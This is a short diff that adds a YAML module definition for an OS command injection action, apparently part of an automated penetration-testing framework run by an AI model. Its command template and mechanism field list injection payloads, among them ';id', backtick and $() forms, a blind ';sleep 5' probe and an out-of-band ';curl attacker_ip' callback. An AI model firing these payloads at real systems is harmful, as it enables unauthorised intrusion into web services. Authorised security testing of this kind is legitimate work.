@@ -1,0 +1,16 @@
+name: command_injection
+category: web
+description: OS command injection exploitation
+preconditions:
+  - service.port==80
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "curl -s '{target_url}' -d '{parameter}=;id'"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "Inject OS commands via semicolon, pipe, backtick, $(), or newline. Test: ;id, |id, `id`, $(id). Blind: ;sleep 5 and measure response time. Out-of-band: ;curl attacker_ip."
